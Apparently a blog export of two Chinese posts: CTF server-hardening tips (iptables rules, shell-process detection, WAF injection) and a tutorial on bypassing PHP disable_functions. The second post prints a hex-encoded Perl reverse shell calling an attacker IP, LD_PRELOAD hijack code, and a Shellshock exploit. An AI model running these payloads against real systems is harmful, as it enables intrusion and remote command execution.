INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP　　　　　　#匹配到SYN FIN PSH的丢弃iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP　 　　#匹配到SYN FIN RST PSH的丢弃iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP　　　　　　#匹配到 SYN,RST的丢弃iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP 　　　　　 #匹配到 SYN,FIN的丢弃\n\n** （7）防DDOS攻击**\niptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT\n\n　　-m limit: 启用limit扩展　　–limit 20&#x2F;minute: 允许最多每分钟10个连接　　–limit-burst 100: 当达到100个连接后，才启用上述20&#x2F;minute限制\n丢弃陌生的TCP响应包,防止反弹式攻击\niptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP\n\n　　更多的姿势，需要打开我们的脑洞了，下面是一个通用的firewall脚本，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解：\n#!/bin/bash#Allow youself Ping other hosts , prohibit others Ping youiptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROPiptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT#Close all INPUT FORWARD OUTPUT, just open some portsiptables -P INPUT DROPiptables -P FORWARD DROPiptables -P OUTPUT DROP#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT#Open multiport#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT#Control IP connection#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT#A single IP allows up to 15 new connections in 60 secondsiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT#Prevent port reuseiptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT#Filter abnormal packetsiptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROPiptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP#Prevent DoS attacksiptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT#Discard unfamiliar TCP response packs to prevent rebound attacksiptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP\n\n注意，对于不同的iptables版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。\n\n5. 综合分析控阻溢出类攻击　　关于溢出类攻击，我还没有总结出一些很实用的姿势，这里提供一些思路。\n　　一般来说，溢出攻击成功后，会建立shell通道和网络连接，我们可以配合前面提到的命令，从这两方面入手进行检测和阻隔：\n\n　　检测高权限的进程\n\n　　检测sh，bash等进程\n\n　　检测建立的网络连接\n\n　　检查开放的端口\n\n\n　例子：通过端口和bash发现可疑进程\n\n　　如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket连接数的命令为：\nls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l\n\n比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。\n\n我们还可以检测可疑进程开启的管道。linux下查看进程管道数的命令类似：\nls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l\n\n\n 典型的一个例子是：Apache模块后门mod_rootme，它复用了webserver的80端口，mod_rootme通过管道和bash交互数据，但是由于开启了额外的管道，我们从这个变化上便能察觉到。\n详细内容可以参考：http://t.qq.com/p/t/330573116082464。\n　　总体来说，我们主要可以关注进程情况和网络连接情况，综合分析进程，阻断溢出攻击创建的shel的。\n6. 漏洞修复简单粗暴　　CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。\n　　1. 删站：如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell，参加过几场比赛确实遇到了这种尴尬的事情，web攻防最后都演变成了拼手速的GetShell+留后门+删站。　　2. 删漏洞页面：大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。　　3. 破坏正常功能：如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似upload等这种功能调用函数。\n　　上面这三种其实都算不上修补漏洞了，真实环境下哪能这么干。\n　　4. 采用正常修补手段：规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。\n \n　　谈到那个删站，我忍不住想吐槽几句，我个人是不赞成这种做法的，因为这种操作在比赛中很容易拉仇恨并且产生连锁反应，也不利于个人的进步。有些人认为：我先拿下这台服务器说明我有能力，你没进去就说明你没本事，所以我先进去删了站不让其他人进也无可厚非，有能耐你就先拿下它，那你删了我也没意见。也有人说，真正的对抗里，敌人不会对你仁慈～～没错，挺有道理的，而且强者也应该拥有发言权。但是我们不能只从一个角度考虑问题，换个角度去考虑，CTF竞赛虽然是向着真实的网络环境靠拢，但是它的根本目的是提高竞技者的安全技能和知识水平。对于大部分切磋竞技的玩家来说，参加比赛也都是为了让自己获得提高，大家在同一个平台上进行进行切磋对抗，认识到自己和对手身上的优点与不足，这才是竞技。但是这种行为其实从某种意义上来说已经破坏了比赛的公平性，毕竟如果是因为技术不到位，那当然没什么话说，但是如果网站删了，让别人发挥的地方都没有，这种切磋也没有意义。举个不太恰当的例子，这就像两个人打架，你说你比我强，咱们比比再说，但是你都不让我跟你打，这算什么。再换个角度，其实我一直坚信真正具有强者姿态的人，不畏惧挑战、不怕被人超越，不屑于通过这种手段巩固自己的地位。相反，我们只有将自己至于狂风大浪中，才能成长和蜕变，最终成为一个强者。\n　　无论从什么角度考虑，我们应该敢于挑战自身、挑战别人，不断强大自己，不断去征服，无畏无惧、步履铿锵！\n7. 安全软件锦上添花　　可以使用第三方软件的话，装个WAF，安全狗之类的吧。这个我没什么话要说，附个linux安全狗的链接吧：安全狗linux版：http://www.safedog.cn/website_safedog.html\n　　我们平时也可以搜集或者自己实现一些脚本或者工具备用。\n　　这里有waf一枚：http://hackblog.cn/post/75.html\n　　如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：\nfind /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\\nrequire_once(&#x27;\\/tmp\\/waf.php&#x27;);\\n/g&quot;\n\n命令的意思就是查找&#x2F;var&#x2F;www&#x2F;html目录下所有php文件，在头部添加一句，用require函数引入&#x2F;tmp&#x2F;waf.php文件。因为sed命令利用 &#x2F; 区分文件中的原字符串和修改的字符串，所以我们要对 &#x2F; 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义：&#39;，命令转换过来就是这样：\nfind /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\\nrequire_once(&#x27;/tmp/waf.php&#x27;);\\n/g&quot;\n\n这样，再次打开时我们就会发现已经引入了自定义waf文件。\n\n如果想整站防护，比如防注入waf，在网站的一个公用文件中，如数据库链接文件config.inc.php中, 引入调用waf代码:\nrequire_once(&#x27;waf.php&#x27;);\n\n8. 我可能get了假的flag　　如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点搅屎的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于”getflag”命令，或者”curl”访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。就拿前之前的ISCC来说，这个也是我赛后想到的。这个getflag是一个elf的程序，在&#x2F;usr&#x2F;bin&#x2F;下，顺手给下载了，有兴趣的同学可以去逆向一波。重点在这，有几次我getflag的时候因为webshell丢了，服务器显示了Error。后来想想，我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢，当然我不知道是不是已经有师傅们用了这个手法。这是模拟的效果：\n\n \n 　　怎样实现？比如我们可以添加alias别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现cd，ls等命令都没法用，会怎么样呢？然而这样会不会不太好～～\n　　最后推荐一个感觉挺实用功能很强的远程连接管理工具，可以极大方便我们的工作：MobaXterm。（不是打广告~）\n\n它支持多种连接方式，可以拖拽进行文件管理。支持在打开的会话一键批量执行命令\n \n还有一个非常方便的ssh端口转发功能，支持本地、远程、动态转发。\n\n　　还有很多其他功能貌似很厉害，不过我没用过，就不说了…\n　　真不是打广告。\n三. 对CTF举办的一点小小建议　　如今CTF越来越火，对于这些比赛的举办方，我有着一些不成熟想法和小建议，如果您觉得有什么不合适的地方，纯当娱乐：\n　　（1）扩展竞技形式：目前线下赛web攻防占绝大多数，有些小比赛甚至只有若干web服务器，上面放几个不同类型的站点，形式有些单一了，其实可以增加多种对抗模式，甚至可以让参赛选手走出比赛场地。去年曾有幸聆听了诸葛建伟博士关于打破XCTF现有格局的讲座，他提出了体系化攻防演练，认为CTF可以引入实地wifi渗透、门禁系统突破、无人机攻防、GPS信号对抗等，增加比赛多样性与趣味性，让线下赛不再只是局限于小小的机房~~\n　　（2）重视安全分析与防护。安全不仅仅只是网络攻防对抗，数据分析、取证分析、应急响应、追踪溯源等技能也相当重要，并且在安全人才圈里这方面缺口也比较大。今年六月份，启明星辰主办的2017”信息安全铁人三项赛”（分为”个人逆向赛“、”数据分析赛“、”企业攻防赛“三个赛事），其中”数据分析赛“便是一个典型代表，参赛选手需要分析真实企业网络环境下受网络攻击的流量数据，从中找出攻击者、分析其网络攻击行为，如欺骗劫持、爆破、webshell连接操作等，找到并分析攻击者的后门或者恶意软件。这种模式，有助于参赛者接触到相对更加真实的网络攻击流量的对抗与防御。\n　　（3）完善竞技模式的具体细节，尽量避免取巧或者粗暴姿势。比如拿修补漏洞举例子，现在CTF线下赛中绝大部分参赛者为了维持加固自己的shell，往往都会采用删除部分页面的方法，比如登陆、注册页面，因为采用正常打补丁、修改配置等操作都比较费时费事。但在比赛中这种方式是对于学习真正的安全加固、漏洞修补知识没有太多提高。玩CTF不应该仅仅为了比赛而比赛，或者只是为了拿个奖、拿几张证书，还是要注重从中学到点东西，不过有证书对以后就业还是有些帮助的。\n 　　虽然说这些会增加举办方的负担，给选手增加难度，但是这也是一种趋势。CTF必然要经历从普及到提高的转变，并且随着参赛选手水平的提高，我们确实需要一些更有意思的玩法，这是一个相互促进的关系。当然，对于入门级的CTF选手来说，题目难度过大反而会降低比赛体验，对于不同级别的玩家，可以设置不同级别的赛事。从形式上奖，像引入门禁系统突破、无人机攻防等，对于大部分CTF举办方来说实现起来有些难度，毕竟涉及到不同的环境、设备、人员维护等问题，所以这个不应该强求，但是对网络攻防来说增加如windows 服务器、邮件服务器、路由设备等还是可行的。以后的CTF规格和水平会越来越高，对于参赛选手的挑战难度也会越来越大，这对于举办方和选手来说都是挑战，但是挑战亦是机遇，我们应时刻准备好投入战斗！\n四. 最后的话　　虽说上面提到的这些姿势不可能让我们的靶机变得无懈可击，但是至少能在某种程度上提高它的防御值，希望能对大家有所帮助。最后，祝愿各位CTF参赛选手在比赛中勇创佳绩，同时也祝愿各单位的大佬们都能把CTF筹办的越来越好！\n","categories":["CTF"],"tags":["linux","CTF"]},{"title":"bypass php disable_functions","url":"/2021/02/bypass-php-disable-functions/","content":"前言渗透过程中，当利用webshell执行命令时报错，蚁剑等工具返回ret=127，查看phpinfo信息发现存在disable_functions函数禁用项时，说明存在disable_functions，此时需要进行绕过。\ndisable_functions是php.ini配置文件中的一个黑名单配置项，运维人员或安全管理员出于安全考虑会禁用一些危险PHP函数，如命令执行函数等，导致渗透过程中Webshell无法执行这些命令。如：\ndisable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,link等\n\n常见危险函数功能：\npassthru()：允许执行一个外部程序并回显输出，类似于exec()exec()：允许执行一个外部程序（如UNIX Shell或CMD命令等）system()：允许执行一个外部程序并回显输出，类似于passthru()。chroot()：可改变当前PHP进程的工作根目录，仅当系统支持CLI模式PHP时才工作，不适用于Windowschgrp()：改变文件或目录所属的用户组。chown()：改变文件或目录的所有者。shell_exec()：通过Shell执行命令，并将执行结果作为字符串返回。proc_open()：执行一个命令并打开文件指针用于读取以及写入。proc_get_status()：获取使用proc_open()所打开进程的信息。ini_set()：可用于修改、设置PHP环境配置参数。ini_alter()：ini_set()函数的一个别名函数，功能与ini_set()相同。具体参见ini_set()。ini_restore()：可用于恢复PHP环境配置参数到其初始值。dl()：在 PHP 进行运行过程当中（而非启动时）加载一个PHP外部模块。pfsockopen()：建立一个Internet或UNIX域的socket持久连接。symlink()：在UNIX系统中建立一个符号链接。popen()：可通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行。putenv()：在PHP运行时改变系统字符集环境。低于5.2.6版本的PHP中可配合利用sendmail指令发送特殊参数执行命令。phpinfo()：输出 PHP 环境信息以及相关的模块、WEB环境等信息。scandir()：列出指定路径中的文件和目录。syslog()：可调用 UNIX 系统的系统层 syslog()函数。readlink()：返回符号连接指向的目标文件内容stream_socket_server()：建立一个Internet或UNIX服务器连接error_log()：将错误信息发送到指定位置(文件)。在某些版本的PHP中，可使用error_log()绕过 PHP safe mode，执行任意命令。\n\n\n\n绕过disable_functions常见绕过方法：\n\n使用未过滤的命令执行函数\nexec,shell_exec,system,passthru,popen,proc_open,反单引号等\n\n\n蚁剑bypass插件\n利用环境变量LD_PRELOAD绕过\n利用php漏洞实现命令执行\nphp7-gc-bypass（php 7.0-7.3）：利用PHP garbage collector程序中的堆溢出漏洞触发执行命令\nphp-json-bypass（php 7.0-7.3）：利用json序列化程序中的堆溢出漏洞触发执行命令。蚁剑插件实现。\n\n\n利用Apache+mod_cgi+.htaccess\n利用ImageMagick漏洞绕过\nShellShock漏洞绕过(CVE-2014-6271)\nWindows COM组件绕过\nWindows PHP拓展win32std绕过\n利用PHP7.4的FFI绕过\nPHP-FPM\nTo add\n\n使用未过滤的函数如果常见命令执行函数未被全部过滤，存在遗漏，则可以使用未被过滤的函数去执行命令。查看php文档中中所有的程序执行函数，常见函数system、exec等被过滤，可以使用popen、pcntl_exec等函数。\n\n常见函数： system()、exec()、shell_exec()、passthru()\n其他函数：popen()、proc_open()、pcntl_exec()\n\npcntl是linux的一个php扩展，用于多进程操作，许多PHP的CMS框架都会使用这个拓展。该拓展支持在php中以pcntl_exec函数执行指定程序。如果运维人员安全意识不强，则可能忽略pcntl扩展的相关函数。下面是利用该函数执行的POC，要求PHP 4 &gt;= 4.2.0, PHP 5 on linux。\n&lt;?php /******************************* *查看phpinfo编译参数--enable-pcntl *作者 Spider *nc -vvlp 443********************************/ $ip = &#x27;xxx.xxx.xxx.xxx&#x27;;$port = &#x27;443&#x27;;$file = &#x27;/tmp/bc.pl&#x27;; header(&quot;content-Type: text/html; charset=gb2312&quot;); if(function_exists(&#x27;pcntl_exec&#x27;)) &#123;        $data = &quot;\\x23\\x21\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x70\\x65\\x72\\x6c\\x20\\x2d\\x77\\x0d\\x0a\\x23\\x0d\\x0a&quot;.                &quot;\\x0d\\x0a\\x75\\x73\\x65\\x20\\x73\\x74\\x72\\x69\\x63\\x74\\x3b\\x20\\x20\\x20\\x20\\x0d\\x0a\\x75\\x73\\x65\\x20&quot;.                &quot;\\x53\\x6f\\x63\\x6b\\x65\\x74\\x3b\\x0d\\x0a\\x75\\x73\\x65\\x20\\x49\\x4f\\x3a\\x3a\\x48\\x61\\x6e\\x64\\x6c\\x65&quot;.                &quot;\\x3b\\x0d\\x0a\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x69\\x70\\x20\\x3d\\x20\\x27&quot;.$ip.                &quot;\\x27\\x3b\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x70\\x6f\\x72\\x74\\x20\\x3d\\x20\\x27&quot;.$port.                &quot;\\x27\\x3b\\x0d\\x0a\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x70\\x72\\x6f\\x74\\x6f\\x20\\x3d\\x20\\x67\\x65\\x74\\x70\\x72&quot;.                &quot;\\x6f\\x74\\x6f\\x62\\x79\\x6e\\x61\\x6d\\x65\\x28\\x22\\x74\\x63\\x70\\x22\\x29\\x3b\\x0d\\x0a\\x6d\\x79\\x20\\x24&quot;.                &quot;\\x70\\x61\\x63\\x6b\\x5f\\x61\\x64\\x64\\x72\\x20\\x3d\\x20\\x73\\x6f\\x63\\x6b\\x61\\x64\\x64\\x72\\x5f\\x69\\x6e&quot;.                &quot;\\x28\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x70\\x6f\\x72\\x74\\x2c\\x20\\x69\\x6e\\x65\\x74\\x5f\\x61\\x74\\x6f&quot;.                &quot;\\x6e\\x28\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x69\\x70\\x29\\x29\\x3b\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x73\\x68&quot;.                &quot;\\x65\\x6c\\x6c\\x20\\x3d\\x20\\x27\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x2d\\x69\\x27\\x3b\\x0d\\x0a\\x73\\x6f&quot;.                &quot;\\x63\\x6b\\x65\\x74\\x28\\x53\\x4f\\x43\\x4b\\x2c\\x20\\x41\\x46\\x5f\\x49\\x4e\\x45\\x54\\x2c\\x20\\x53\\x4f\\x43&quot;.                &quot;\\x4b\\x5f\\x53\\x54\\x52\\x45\\x41\\x4d\\x2c\\x20\\x24\\x70\\x72\\x6f\\x74\\x6f\\x29\\x3b\\x0d\\x0a\\x53\\x54\\x44&quot;.                &quot;\\x4f\\x55\\x54\\x2d\\x3e\\x61\\x75\\x74\\x6f\\x66\\x6c\\x75\\x73\\x68\\x28\\x31\\x29\\x3b\\x0d\\x0a\\x53\\x4f\\x43&quot;.                &quot;\\x4b\\x2d\\x3e\\x61\\x75\\x74\\x6f\\x66\\x6c\\x75\\x73\\x68\\x28\\x31\\x29\\x3b\\x0d\\x0a\\x63\\x6f\\x6e\\x6e\\x65&quot;.                &quot;\\x63\\x74\\x28\\x53\\x4f\\x43\\x4b\\x2c\\x24\\x70\\x61\\x63\\x6b\\x5f\\x61\\x64\\x64\\x72\\x29\\x20\\x6f\\x72\\x20&quot;.                &quot;\\x64\\x69\\x65\\x20\\x22\\x63\\x61\\x6e\\x20\\x6e\\x6f\\x74\\x20\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x3a\\x24\\x21&quot;.                &quot;\\x22\\x3b\\x0d\\x0a\\x6f\\x70\\x65\\x6e\\x20\\x53\\x54\\x44\\x49\\x4e\\x2c\\x20\\x22\\x3c\\x26\\x53\\x4f\\x43\\x4b&quot;.                &quot;\\x22\\x3b\\x0d\\x0a\\x6f\\x70\\x65\\x6e\\x20\\x53\\x54\\x44\\x4f\\x55\\x54\\x2c\\x20\\x22\\x3e\\x26\\x53\\x4f\\x43&quot;.                &quot;\\x4b\\x22\\x3b\\x0d\\x0a\\x6f\\x70\\x65\\x6e\\x20\\x53\\x54\\x44\\x45\\x52\\x52\\x2c\\x20\\x22\\x3e\\x26\\x53\\x4f&quot;.                &quot;\\x43\\x4b\\x22\\x3b\\x0d\\x0a\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x24\\x73\\x68\\x65\\x6c\\x6c\\x29\\x3b\\x0d\\x0a&quot;.                &quot;\\x63\\x6c\\x6f\\x73\\x65\\x20\\x53\\x4f\\x43\\x4b\\x3b\\x0d\\x0a\\x65\\x78\\x69\\x74\\x20\\x30\\x3b\\x0a&quot;;        $fp = fopen($file,&#x27;w&#x27;);        $key = fputs($fp,$data);        fclose($fp);        if(!$key) exit(&#x27;写入&#x27;.$file.&#x27;失败&#x27;);        chmod($file,0777);        pcntl_exec($file);        unlink($file);&#125; else &#123;        echo &#x27;不支持pcntl扩展&#x27;;&#125;?&gt;\n\n\n\n\n\n蚁剑bypass插件Webshell管理工具蚁剑的bypass插件已实现一些方式绕过disable_functions和open_basedir等安全限制，渗透时快速食用可提高效率。代码仓库地址，主要代码在 core/php_fpm/index.js 里。\n利用LD_PRELOAD劫持系统函数LD_PRELOAD是linux的一个环境变量，它可以定义程序运行前优先加载的动态链接库，其主要是用来有选择性的载入不同动态链接库中的相同函数。这个特性可以被恶意利用，攻击者可以劫持程序加载的动态链接库，执行其中的自定义恶意函数。关于LD_PRELOAD解析可以参考：Reverse Engineering with LD_PRELOAD。\n举例说明：\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv) &#123;\tchar passwd[] = &quot;123456&quot;;\tif (argc &lt; 2) &#123;\t\tprintf(&quot;usage: %s &lt;given-password&gt;\\n&quot;, argv[0]);\t\treturn 0;\t&#125;\tif (!strcmp(passwd, argv[1])) &#123;\t\tprintf(&quot;Right password!\\n&quot;);\t\treturn 1;\t&#125;\tprintf(&quot;Wrong password!\\n&quot;);\treturn 0;&#125;\n\n这是一个简单的判断密码是否正确的程序例子，输入正确的密码123456则会提示正确，否则提示错误。\nssooking@pc:~/Test$ gcc test.c -o testssooking@pc:~/Test$ ./test 11111Wrong password!ssooking@pc:~/Test$ ./test 123456Right password!\n\n可以用ldd或readelf命令查看一下动态链接库依赖关系\n$ ldd test\tlinux-vdso.so.1 =&gt;  (0x00007ffe4dbfc000)\tlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dd927a000)\t/lib64/ld-linux-x86-64.so.2 (0x00007f4dd9644000)$ readelf -d test\n\n通过readelf -Ws test可以查看程序可能调用的系统API函数，但这个命令结果仅代表可能被调用的API，不代表一定调用。通过strace -f + 执行程序可看到程序运行时实际的调用情况。\n由于上面的代码调用了标准库里的strcmp()方法，我们可以重写strcmp()方法，攻击代码：\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload()&#123;\tprintf(&quot;Hijacked!\\n&quot;);&#125;int strcmp(const char *s1, const char *s2) &#123;\tpayload();\treturn 0;\t//结果总返回相等&#125;\n\n编译并加载动态链接库，观察加载前后的执行结果\nssooking@pc:~/Test$ gcc -fPIC -c hijack.c -o hijack.ossooking@pc:~/Test$ gcc -shared hijack.o -o hijack.sossooking@pc:~/Test$ ./test 111111Wrong password!ssooking@pc:~/Test$ export LD_PRELOAD=./hijack.sossooking@pc:~/Test$ ./test 111111Hijacked!Right password!\n\n发现加载了恶意动态链接库中的strcmp函数，使返回结果总相等，并打印了测试payload。\n在php中，可以使用putenv设置环境变量，同理，绕过disable_functions思路：\n\n找到要劫持的目标函数（系统调用）\n生成一个恶意动态链接库文件，重写该函数\n利用putenv设置LD_PRELOAD，加载恶意动态链接库文件\n配合php的某个函数去触发创建新进程，从而加载被劫持的函数，如：mail,imap_mail,error_log,mb_send_mail、__attribute__ ((__constructor__))、imagemagick+GhostScript\n执行需要的命令\n\n例1：以 php的mail函数为例，通过劫持getuid 函数启动新进程\n限制：从 strace 命令的结果看mail 函数的使⽤依赖于系统中存在的 sendmail 命令\ngcc -c -fPIC test.c -o hack &amp;&amp; gcc --share hack -o hack.so  &lt;?phpputenv(&quot;LD_PRELOAD=./hack.so&quot;);mail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);?&gt;\n\n\n\n实战中执行不同命令需要反复编译上传文件进行劫持怎么办？\n解决方法是劫持的函数中，写入执行其他脚本或程序的命令，如：\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;        system(&quot;echo `python cmd.py` &gt; result.txt&quot;);&#125;   int geteuid() &#123;  if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;  unsetenv(&quot;LD_PRELOAD&quot;);  payload();&#125;\n\ncmd.py\nimport subprocesswith open(&#x27;cmd.txt&#x27;) as fp:    print subprocess.call(fp.read(), shell=True)\n\n这样只需要修改 cmd.txt就可以执行不同命令，而无需重新编译。\n如何找到支持创建新进程的函数？\nphp基于C语言开发，linux也基于C语言开发，函数实现上有相同之处。我们可以追踪php自带的函数执行时的函数调用，找到可以启动新进程的函数，但启动的方式不能是exec,system,passthru等这种被过滤的。如原作者发现了php中的mail函数在运行时可以通过execve启用新进程：\nstrace -f php mail.php 2&gt;&amp;1 |grep -A2 -B2 execve\n\n如：error_log函数也会调用execve创建新进程，\n&lt;?phpputenv(&quot;LD_PRELOAD=./test.so&quot;);error_log(&quot;test&quot;,1,&quot;&quot;,&quot;&quot;);?&gt;\n\n优化使用LD_PRELOAD劫持函数存在一些问题，如：\n\n一、有些函数服务器不支持，如mail函数实际依赖的是sendmail，但是目标服务器未安装。\n二、通过LD_PRELOAD劫持了启动进程的相关函数，如果劫持后启动的新进程同样调用该函数，那么如果不在新进程启动前取消LD_PRELOAD，则将陷入死循环。通常做法调用 unsetenv(&quot;LD_PRELOAD&quot;)删除环境变量。这在大部分linux上可行，但在centos上却无效，因为centos自己也hook 了unsetenv()，在其内部启动了其他进程，还没有删除LD_PRELOAD就又被劫持，导致无限循环。\n\n基于这些问题，有师傅做了一个优化，项目地址。作者选择预加载实现__attribute__((constructor))构造函数的动态库文件，该函数会在main()之前执行，因此无需劫持某个函数即可执行我们的代码。\n项目中有三个关键文件：\n\nbypass_disablefunc.php\nbypass_disablefunc_x64.so\nbypass_disablefunc_x86.so\n\nbypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：\nbypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so\n\n一是cmd参数，待执行的系统命令；\n二是outpath参数，保存命令执行输出的文件路径（如&#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意web是否有读写权限、网络是否可跨目录访问、文件将被覆盖和删除系统等卫星；\n三是sopath参数，指定劫持函数的共享对象的绝对路径（如&#x2F;var&#x2F;www&#x2F;bypass_disablex64.so），另外，关于该参数，你应该注意网络是否可以跨目录访问它。\nShellShock漏洞绕过利用ShellShock，即bash破壳漏洞（CVE-2014-6271）绕过。该漏洞存在于bash 1.14 – 4.3版本中，漏洞原因是以()&#123;开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。该漏洞要求php &lt; 5.6.2，分析文章可参考PHP Execute Command Bypass Disable_functions。POC：\n&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @mail.c:283    $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);    putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;);    // In Safe Mode, the user may only alter environment variableswhose names    // begin with the prefixes supplied by this directive.    // By default, users will only be able to set environment variablesthat    // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty,    // PHP will let the user modify ANY environment variable!    //mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail    error_log(&#x27;a&#x27;,1);   $output = @file_get_contents($tmp);    @unlink($tmp);    if($output != &quot;&quot;) return $output;    else return &quot;No output, or not vuln.&quot;; &#125; echo shellshock($_REQUEST[&quot;cmd&quot;]); ?&gt;\n\n\n\n\n\nImageMagick漏洞绕过ImageMagick是一款使用广泛的图片处理程序，Discuz、Drupal、Wordpress等常用CMS中也调用了ImageMagick扩展或ImageMagick库进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但在ImageMagick6.9.3-9以前的所有版本中都存在一个漏洞，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入，该漏洞可用于绕过disable_functions，EXP：\n&lt;?phpecho &quot;Disable Functions: &quot; . ini_get(&#x27;disable_functions&#x27;) . 